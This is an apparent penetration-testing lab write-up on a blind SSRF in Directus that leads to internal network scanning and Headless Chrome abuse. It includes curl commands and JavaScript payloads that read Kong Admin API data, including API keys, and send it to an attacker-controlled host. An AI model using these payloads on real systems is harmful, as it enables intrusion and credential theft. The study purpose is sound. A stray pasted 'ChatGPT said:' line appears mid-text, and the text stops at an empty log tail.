# Server-Side Request Forgery
This module demonstrates a black-box testing approach for microservices behind an API gateway, focusing on an SSRF vulnerability in Directus v9.0.0 rc34. The SSRF allowed discovery of internal services and led to remote code execution via a headless browser.
## Introduction to Microservices
Microservices are small, independent services that handle specific functions within a larger application. They replace monolithic architectures, allowing teams to develop and deploy components separately. For example, an e-commerce site might have separate services for Auth, Products, and Checkout.

These services often run in containers and communicate via DNS, especially in Docker environments. They expose functionality through APIs, typically RESTful.

An API gateway serves as a single entry point, handling tasks like authentication, rate limiting, and TLS. If bypassed, internal services may be exposed without proper security. Understanding URL structures is key to identifying and interacting with these services.

### Web Service URL Formats
Web service URLs typically follow structured patterns for routing requests. Common elements include versioning (e.g., `/v1/`), service names (e.g., `/products/`), and parameters (e.g., `/users/octocat`).

Some APIs use subdomains for routing, others use path-based patterns. Versioning may appear in the URL or be handled via request headers.
## API Discovery via Verb Tampering
RESTful APIs use HTTP methods (verbs) to define actions:

- `GET` retrieves data (typically read-only).
- `POST` creates new data or objects.
- `PUT`/`PATCH` update existing data—`PUT` replaces the whole object; `PATCH` updates parts.
- `DELETE` removes data.

Though these are standard conventions, implementations can vary. Some services may misuse methods (e.g., using `POST` for deletion) or not support all methods. SOAP APIs, by contrast, use `POST` for all actions, with operations defined as methods like lookupUser.

Because tools often default to `GET` requests, they may miss endpoints requiring other methods. Understanding method behavior is key when exploring or testing APIs.
### Initial Enumeration
We began API discovery by sending a request to the API gateway:
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i http://apigateway:8000                                  
HTTP/1.1 404 Not Found
Date: Mon, 28 Jul 2025 17:18:18 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Content-Length: 48
X-Kong-Response-Latency: 1
Server: kong/2.2.1

{"message":"no Route matched with those values"}                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
Which returned a `404 Not Found` and revealed it’s powered by `Kong Gateway 2.2.1`. Attempts to access the Kong Admin API on port `8001` failed:
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i http://apigateway:8001 
curl: (7) Failed to connect to apigateway port 8001 after 81 ms: Could not connect to server
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
Using Gobuster, we brute-forced directories on port `8000` and captured endpoints returning `403 Forbidden` and `401 Unauthorized`, which often indicate valid paths that require authentication.

An API might return an HTTP `405 Method Not Allowed` response to a `GET` request. 
```bash
gobuster dir -u http://apigateway:8000 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b "" -s "200,204,301,302,307,401,403,405,500"
```
Then we used in a second Gobuster scan proxied through Burp Suite for deeper analysis.

**Key findings:**
- `/render` endpoints returned `401 Unauthorized` with a `WWW-Authenticate: Key realm="kong"` header, indicating API key protection.
- `/users` and `/files` returned `403 Forbidden` responses with headers indicating a **`Directus`** (an instant app and API for your SQL database) backend and messages referencing `directus_users` and `directus_files` collections.

This helped identify three key services worth further testing:
- files
- users
- render

lets save them in a new file called `endpoints_simple.txt`
### Advanced Enumeration with Verb Tampering
Now that we have three potential API services, let's do another round of enumeration. URLs for RESTful APIs often follow a pattern of `<object>`/`<action>` or `<object>`/`<identifier>`. We might be able to discover more services by taking the list of endpoints we have already identified and iterating through a wordlist to find valid actions or identifiers.

We also need to keep in mind that web APIs might respond differently based on which HTTP request method we use. For example, a `GET` request to `/auth` might return an HTTP `404` response, while a `POST` request to the same URL returns an HTTP `200 OK` on a valid login or an HTTP `401 Unauthorized` on an invalid login attempt.

**Custom Script:** [route_buster.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/route_buster.py) 

A Python script was written to:
- Take a list of base endpoints (`-w`) and action words (`-a`).
- Send both `GET` and `POST` requests to all `/endpoint/action` combinations.
- Print results for responses not in [`204`, `401`, `403`, `404`].

**Output:**
```bash
┌──(kali㉿kali)-[~]
└─$ python3 route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://apigateway:8000 
Path                    -       GET     POST
/files/import            -      403     400
/users/frame             -      200     404
/users/home              -      200     404
/users/invite            -      403     400
/users/readme            -      200     404
/users/welcome           -      200     404
/users/wellcome          -      200     404
Wordlist complete. Goodbye.
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
**Findings:**
- Several `/users/*` paths returned `200 OK` for `GET`, but no useful content.
- `/files/import` and `/users/invite` returned `400 Bad Request` for `POST` request instead of HTTP `403 Forbidden`, **suggesting the endpoints are active and expecting input**, but malformed request has been sent.
- A `POST` to `/files/import` revealed an error: `"url" is required`, indicating the API expects a `url` parameter.
```bash
──(kali㉿kali)-[~]
└─$ curl -i -X POST http://apigateway:8000/files/import             
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 86
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"56-egVc9WbgXViwv0ZIaPJS4bmcvSo"
Date: Mon, 28 Jul 2025 18:02:05 GMT
X-Kong-Upstream-Latency: 14
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
- The `/files/import` endpoint is **unauthenticated**, active, and potentially vulnerable to Server-Side Request Forgery (SSRF).
- Any time we discover an API or web form that includes a `url` parameter, we always want to check it for a Server-Side Request Forgery vulnerability.

## Server-Side Request Forgery Discovery
Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks a server into making unauthorized requests. Because the request originates from the server, it may access internal resources, such as services on localhost, internal IP ranges, or systems behind firewalls or reverse proxies.

We always want to check `url` parameters in an API or web form for an SSRF vulnerability. 

First, let's determine if we can make it connect back to our Kali machine. We'll need to make sure our HTTP server is running.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Since the server returned the error as a JSON message, let's make our POST request use JSON as well.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.203/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Mon, 28 Jul 2025 18:07:42 GMT
X-Kong-Upstream-Latency: 214
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
Then check your HTTP sever:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.130.135 - - [28/Jul/2025 14:07:42] code 404, message File not found
192.168.130.135 - - [28/Jul/2025 14:07:42] "GET /ssrftest HTTP/1.1" 404 -

```
This backend service is vulnerable to SSRF. The user agent on the request is Axios, an HTTP client for Node.js.

Placing a file named `ssrftest` on the attacker's web server, a `POST` request to `/files/import` with the file’s URL triggered a backend request.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.203/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Tue, 29 Jul 2025 00:23:17 GMT
X-Kong-Upstream-Latency: 166
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```
Although the server returned a `403 Forbidden` error, Server logs confirmed the server accessed the file and received a `200 OK` response.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.130.135 - - [28/Jul/2025 20:23:17] "GET /ssrftest HTTP/1.1" 200 -

```
This confirms a **blind SSRF vulnerability**—the backend can make unauthenticated outbound requests, but the response data isn't returned to the attacker.
### Souorce Code Analysis
The SSRF vulnerability in Directus stems from how the `/files/import` endpoint handles requests before performing authentication or authorization.

#### In `/api/src/middleware/authenticate.ts`:
```ts
12  const authenticate: RequestHandler = asyncHandler(async (req, res, next) => {
13    req.accountability = {
14      user: null,
15      role: null,
16      admin: false,
17      ip: req.ip.startsWith('::ffff:') ? req.ip.substring(7) : req.ip,
18      userAgent: req.get('user-agent'),
19    };
20  
21    if (!req.token) return next();
22  
23    if (isJWT(req.token)) {
```
If no token is provided, the middleware **does not block the request**, and simply moves to the next handler.

The `req.accountability` object is initialized with `user: null` and `role: null`, allowing unauthenticated access to continue.

#### In `/api/src/controllers/files.ts`, the vulnerable endpoint begins at line `138`:
```ts
138  router.post(
139    '/import',
140    asyncHandler(async (req, res, next) => {
141      const { error } = importSchema.validate(req.body);
142  
143      if (error) {
144        throw new InvalidPayloadException(error.message);
145      }
146  
147      const service = new FilesService({
148        accountability: req.accountability,
149        schema: req.schema,
150      });
```
The function validates input, creates a service with `req.accountability`, then proceeds without checking auth.

The core SSRF happens here:
```ts
const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, {
  responseType: 'stream',
});

```
**Axios fetches the user-supplied URL** before any access checks, allowing attackers to trigger internal requests.

Because URL fetching (`axios.get`) happens **prior to any authentication or authorization**, this endpoint is vulnerable to **unauthenticated blind SSRF**.
### Exploiting Blind SSRF in Directus
Since we cannot access the results of the SSRF, how can we use it to further our attack? As we have already demonstrated, the application returns different messages for valid files and non-existing files. We can use these different messages to infer if a resource exists.

As a reminder, we receive an HTTP `403 Forbidden` when we request a valid resource and an HTTP `500 Internal Server Error` with "Request failed with status code `404`" when we request a resource that doesn't exist.

We tested whether the SSRF vulnerability could be used to make Directus connect to itself by targeting localhost.
```bash
curl -i -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8000/"}' \
  http://apigateway:8000/files/import

```
Server response:
```bash
"connect ECONNREFUSED 127.0.0.1:8000"
```
This confirms Directus is not listening on port `8000` (likely API Gateway is). `"localhost"` refers to the Directus server, not the Kong API Gateway.

`localhost`:`8055` (Directus default port):
```bash
curl -i -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8055/"}' \
  http://apigateway:8000/files/import

```
Server response:
```bash
"You don't have permission to access this."

```
This confirms that SSRF request reached Directus on port `8055` as it returned HTTP `403 Forbidden`, but confirms a valid internal resource was accessed.

We can easily verify that TCP port `8055` is **closed externally on the Kong API Gateway server**. We are likely dealing with two or more servers in this scenario.
#### Port Scanning via Blind SSRF
we can still use the different HTTP response codes and error messages to determine if we've requested a valid resource. We can use this information to write a script that will exploit the SSRF vulnerability and act as a port scanner.

Rather than exhaustively scanning all 65,535 ports, we optimize SSRF-based port scanning by focusing on a small set of common ports to speedup the proccess.

A Python script was written: [ssrf_port_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_port_scanner.py)

`"You don't have permission"` → Port OPEN (valid resource)

`"ECONNREFUSED"` → Port CLOSED

Output:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5                             
22      CLOSED
80      CLOSED
443     CLOSED
1433    CLOSED
1521    CLOSED
3306    CLOSED
3389    CLOSED
5000    CLOSED
5432    CLOSED
5900    CLOSED
6379    CLOSED
8000    CLOSED
8001    CLOSED
8055    OPEN (permission error indicates resource exists)
8080    CLOSED
8443    CLOSED
9000    CLOSED
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```
The scan results are not inspiring. We only scanned a handful of ports, but only port 8055 is open, which the web service is running on. The common services for connecting to a server, such as SSH and RDP, are either not present or not running on their normal ports. There are no common database ports open either. We are likely communicating with a microservice running in a container.

#### Subnet Scanning with SSRF
According to its description, Directus is a platform for "managing the content of any SQL database". It is reasonable to expect that Directus will connect to a database server. Let's try using the SSRF vulnerability to scan for other targets on the internal network.

However, we don't know the IP address range the network uses. We can attempt to scan private IP ranges.
If we attempt to brute force host names, we need to account for any extra latency introduced by DNS lookups on the victim machine.

On the other hand, there are three established ranges for private IP addresses.
| IP address range | Number of addresses |
|------------------|---------------------|
| 10.0.0.0/8       | 16,777,216         |
| 172.16.0.0/12    | 1,048,576          |
| 192.168.0.0/16   | 65,536             |

Scanning an entire `/8` or even a `/12` network via SSRF could take several days. Rather than scanning an entire subnet, we can try scanning for network gateways. Network designs commonly use a `/16` or `/24` subnet mask with the gateway running on the IP where the forth octet is `".1"` (for example: `192.168.1.1/24` or `172.16.0.1/16`). However, gateways can live on any IP address and subnets can be any size. 

As we noticed during our port scan, the Axios library will respond relatively quickly with `ECONNREFUSED` when a port is closed but the host is up.

```bash
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 178631 microseconds
```
A request to a closed port took **0.178631 seconds**. However, If the host is not reachable, the server will take much longer and timeout.

```bash
kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://10.66.66.66"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
Total: 60155041 microseconds
```
A request to an invalid host took **60.155041 seconds**. We can assume that the timeout is configured to one minute. Using this information, we can deduce if an IP is valid or not, in a technique similar to an Nmap host scan. If we search for a gateway (assuming the gateway ends with `".1"`), we can discover the subnet the containers are running on.

Balancing request timeouts is crucial during SSRF scanning. Waiting for every server response without a timeout makes scans very slow, while setting the timeout too low can overwhelm the server and result in false negatives. An optimal timeout value is needed to ensure scans are both efficient and accurate.

We'll write a new script to scan subnets for default gateways and constrain our port scanning to a single port to reduce scan time. The port we decide to scan does not matter since we are only attempting to determine if the host is up.
ChatGPT said:

To scan for default gateways, `".1"` is used as the fourth octet in each IP address. Because the `10.0.0.0/8` and `172.16.0.0/12` networks have fixed first octets, nested loops are used to iterate through the second and third octets. Since scanning the `192.168.0.0/16` range produced no results, the focus shifts to the `172.16.0.0/12` range.

Script: [ssrf_gateway_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_gateway_scanner.py)

Output:
```bash
kali@kali:~$ python3 ssrf_gateway_scanner.py -t http://apigateway:8000/files/import
Trying host: http://172.16.1.1
        8000     timed out
Trying host: http://172.16.2.1
        8000     timed out
...
Trying host: http://172.16.15.1
        8000     timed out
Trying host: http://172.16.16.1
        8000     OPEN - returned 404
Trying host: http://172.16.17.1
        8000     timed out
```
We found a live IP address at `172.16.16.1`. It may seem odd that a gateway has an open port but this may be an idiosyncrasy of the underlying environment. The important takeaway here is that it responded differently than the other IPs. Even a `"connection refused"` message would indicate we had found something interesting.

#### Host Enumeration
Now that we've identified a live IP address, let's copy our script to a new file named ssrf_subnet_scanner.py and modify it to scan just the subnet we previously identified for live IPs. It does not matter which port number we use in this scan. We can identify live hosts even if they refuse connections on the chosen port.

Script: [host_enum.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/host_enum.py) 

Output:
```bash
kali@kali:~$ python3 host_enum.py -t http://apigateway:8000/files/import --timeout 5
Trying host: 172.16.16.1
        8000     OPEN - returned 404
Trying host: 172.16.16.2
        8000     OPEN - returned 404
Trying host: 172.16.16.3
        8000     Connection refused, could be live host
Trying host: 172.16.16.4
        8000     Connection refused, could be live host
Trying host: 172.16.16.5
        8000     Connection refused, could be live host
Trying host: 172.16.16.6
        8000     Connection refused, could be live host
Trying host: 172.16.16.7
        8000     {"errors":[{"message":"connect EHOSTUNREACH 172.16.16.7:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Trying host: 172.16.16.8
        8000     {"errors":[{"message":"connect EHOSTUNREACH 172.16.16.8:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
```
This error message might mean the host couldn't find a route to a given IP address. Since we have several live hosts to work with, we can ignore any IP addresses that resulted in the "EHOSTUNREACH" error.

Based on the response values, we can assume the first six hosts are valid. Let's modify the script to scan for common ports on those hosts, using the same list of ports.

We can limit the amount of extraneous data by filtering `"connection refused"` messages.

Scan for common port on these live hosts: [liveIP_port_scan.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/liveIP_port_scan.py)

Output:
```bash
kali@kali:~$ python3 liveIP_port_scan.py -t http://apigateway:8000/files/import --timeout 5
Trying host: 172.16.16.1
        22       ???? - returned parse error, potentially open non-http
        8000     OPEN - returned 404
Trying host: 172.16.16.2
        8000     OPEN - returned 404
        8001     OPEN - returned permission error, therefore valid resource
Trying host: 172.16.16.3
        5432     OPEN - socket hang up, likely non-http
Trying host: 172.16.16.4
        8055     OPEN - returned permission error, therefore valid resource
Trying host: 172.16.16.5
        9000     OPEN - returned 404
Trying host: 172.16.16.6
        6379     ???? - returned parse error, potentially open non-http
```
These results are promising. We know the Kong API Gateway is running on `8000`. This port is open on the first two hosts. Kong runs its Admin API on port `8001`, restricted to localhost. Since `172.16.16.2` has ports `8000` and` 8001` open, we can assume that it is running the Kong API Gateway. The host on `172.16.16.1` is likely the network gateway or an external network interface.

The default port for Directus is `8055`, which aligns with host four. Port `5432` is the default port for PostgreSQL. Port `6379` is the default port for REDIS. Using this information, we now have a better picture of the internal network.

We still have one host running an unknown HTTP service on port `9000`. However, the SSRF vulnerability allows us to verify which backend servers are hosting the public endpoints we have identified.
## Render API Auth Bypass
We identified the `/render` service during enumeration, but it requires authentication via an API gateway. To bypass this, we can attempt SSRF to access the service directly. Since it's likely not hosted on the Directus server, we'll test the unknown service on port `9000` using SSRF to check if `http://172.16.16.3:9000/render` is valid.

```bash
kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/render"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Thu, 25 Feb 2021 16:59:49 GMT
X-Kong-Upstream-Latency: 33
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
```
Our request failed to locate a valid resource, likely because the backend URL differs from the one exposed by the API gateway—possibly due to versioning. We'll try fuzzing and analyzing response codes to identify the correct backend path.

First, we'll need to build a short wordlist with potential URLs.
```text
/
/render
/v1/render
/api/render
/api/v1/render
```
Then a Python script: [ssrf_path_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_path_scanner.py)

Was written to send SSRF payloads by iterating through a file containing a list of paths.

Output:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000 -p paths.txt --timeout 5
/       DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
/render DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
/v1/render      DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
/api/render     EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
/api/v1/render  DOES NOT EXIST: {"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```
We received one interesting response: `"Request failed with status code 400"`. An HTTP `400 Bad Request` usually indicates that the server cannot process a request due to missing data or a client error.

If the service generates content, we need to determine how to supply data to it. We'll start by testing a small set of relevant parameter names and values, **including our Kali host in URLs to monitor for callbacks**. `paths2.txt`:

```text
?data=foobar
?file=file:///etc/passwd
?url=http://192.168.45.203/render/url
?input=foobar
?target=http://192.168.45.203/render/target
```
Even without valid parameters, triggering errors on the render service might reveal useful clues. In unfamiliar environments, subtle differences in server responses can help us understand the system. We'll run a new wordlist through our [ssrf_path_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_path_scanner.py) script again, updating the SSRF target to the new URL. With an Apache HTTP server opened on port `80` (don't use Python server because it doesn't desplay the useragent):

```bash
┌──(kali㉿kali)-[~]
└─$ sudo systemctl start apache2
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```

Output:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000/api/render -p paths2.txt --timeout 5      
?data=foobar    EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?file=file:///etc/passwd        EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?url=http://192.168.45.203/render/url   EXISTS: {"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
?input=foobar   EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
?target=http://192.168.45.203/render/target     EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```
It seems the url parameter was a valid request based on the permission error message. Let's check if it actually connected back to our Kali host.
```bash
┌──(kali㉿kali)-[~]
└─$ sudo tail /var/log/apache2/access.log
192.168.217.135 - - [29/Jul/2025:11:55:23 -0400] "GET /render/url HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```
Not only did we receive a request from the render service, `HeadlessChrome/79.0.3945.0` made the request.
### Exploiting Headless Chrome
Previously, SSRF in the Directus Files API used the `axios` user agent. Now, by targeting the Render API, we can make a Headless Chrome instance access URLs. Unlike basic SSRF, Headless Chrome behaves like a full browser, executing JavaScript. This allows us to run arbitrary scripts on the remote server, enabling interaction with internal services, data extraction, and more complex actions.

let's verify the headless browser will execute JavaScript. We will create a simple HTML page with a JavaScript function that runs on page load.
```html
<html>
<head>
<script>
function runscript() {
    fetch("http://192.168.45.203/itworked");
}
</script>
</head>
<body onload='runscript()'>
<div></div>
</body>
</html>
```
Since the application does not return the page loaded with the SSRF vulnerability, we need another way to determine if the browser executes JavaScript. Our JavaScript function uses `fetch()` to make a call back to our Kali host. The `onload` event in the body tag calls our function. After placing this file in our webroot, let's use the SSRF vulnerability to call the render service pointed at this file.

let's use the SSRF vulnerability to call the render service pointed at this file.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/hello.html"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Tue, 29 Jul 2025 16:22:32 GMT
X-Kong-Upstream-Latency: 1402
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```
Since we received a "forbidden" response, the browser should have loaded our HTML page. Let's check our Apache access log for the callback.

```bash
┌──(kali㉿kali)-[/var/www/html]
└─$ tail -f /var/log/apache2/access.log
192.168.217.135 - - [29/Jul/2025:11:55:23 -0400] "GET /render/url HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:12:22:31 -0400] "GET /hello.html HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:12:22:31 -0400] "GET /itworked HTTP/1.1" 404 492 "http://192.168.45.203/hello.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"


```

We have verified we can execute JavaScript in the Headless Chrome browser.

### Using JavaScript to Exfiltrate Data
The goal is to upgrade a blind SSRF (Server-Side Request Forgery) to a functional SSRF using JavaScript to call the Kong Admin API from within the internal network. The attack leverages the fact that the Headless Chrome browser running inside the network can access internal services on ports not exposed externally, specifically port `8001` on the Kong API Gateway.
The network architecture follows Docker's default bridge network behavior where containers can communicate internally on all ports, but only explicitly published ports are accessible from outside. This explains why port `8000` is accessible externally (published) while port `8001` is only available for internal container communication (exposed but not published).
The JavaScript will execute from the Chrome browser's context, allowing it to make HTTP requests to internal services that would be unreachable from external attackers, effectively turning the blind SSRF into a data exfiltration channel.

Let's create a new HTML page with a JavaScript function. First, the function will make a request to the Kong Admin API. If CORS is enabled and permissive enough on the Admin API, our JavaScript function will be able to access the response body and send it back to the web server running on our Kali host. If this doesn't work, we will have to consult the documentation for the Kong Admin API and determine what we can do without CORS.

```html
<html>
<head>
<script>
function exfiltrate() {
    fetch("http://172.16.16.2:8001")
    .then((response) => response.text())
    .then((data) => {
        fetch("http://192.168.45.203/callback?" + encodeURIComponent(data));
    }).catch(err => {
        fetch("http://192.168.45.203/error?" + encodeURIComponent(err));
    }); 
}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>
```
After placing the JavaScript function in an HTML file in our webroot, we will again call the Render API on the new HTML page.

Let's trigger the SSRF vulnerability
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/exfil.html"}' http://apigateway:8000/files/import
{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```
When we check access.log, we should have the callback message.
```log
kali@kali:~$ sudo tail /var/log/apache2/access.log 
...
192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /exfil.html HTTP/1.1" 200 562 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:13:01:10 -0400] "GET /callback?%7B%22plugins%22%3A%7B%22enabled_in_cluster%22%3A%5B%22key-auth%22%5D%2C%22available_on_server%22%3A%7B%22grpc-web%22%3Atrue%2C%22correlation-id%22%3Atrue%2C%22...042%2C%22mem_cache_size%22%3A%22128m%22%2C%22pg_max_concurrent_queries%22%3A0%2C%22nginx_main_worker_p" 414 0 "-" "-"
```
Excellent. Our JavaScript function sent a request to the internal endpoint, then sent that response as a URL-encoded value back to our Kali host. The message might have been truncated, but our JavaScript function worked.
### Stealing Credentials from Kong Admin API
Next, we'll turn our focus to stealing credentials from the Kong Admin API with our JavaScript payload. As a reminder, when we first called the /render endpoint through the Kong API Gateway, it responded with `"No API key found in request"`. Let's try to find that API key in Kong's Admin API.

We can find the Admin API endpoint that returns API keys in Kong's documentation. Let's update our JavaScript function to call `/key-auths`, call the Render service, and then check `access.log`.
```html
<html>
<head>
<script>
function exfiltrate() {
    // Send initial status
    fetch("http://192.168.45.203/status?msg=script_started").catch(() => {});
    
    fetch("http://172.16.16.2:8001/key-auths")
    .then((response) => {
        fetch("http://192.168.45.203/status?msg=kong_response_received&status=" + response.status).catch(() => {});
        return response.text();
    })
    .then((data) => {
        fetch("http://192.168.45.203/status?msg=data_received&length=" + data.length).catch(() => {});
        chunks = data.match(new RegExp('.{1,1024}','g'));
        for(i = 0; i < chunks.length; i++) {
            fetch("http://192.168.45.203/callback?chunk=" + i + "&data=" + encodeURIComponent(chunks[i])).catch(() => {});
        }
    })
    .catch((error) => {
        fetch("http://192.168.45.203/error?msg=" + encodeURIComponent(error.toString())).catch(() => {});
    });
}
</script>
</head>
<body onload='exfiltrate()'>
<div></div>
</body>
</html>
```
After triggering the SSRF 
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/exfil.html"}' http://apigateway:8000/files/import
{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```
We got the response to our kali machine
```log
┌──(kali㉿kali)-[/var/www/html]
└─$ tail -f /var/log/apache2/access.log           
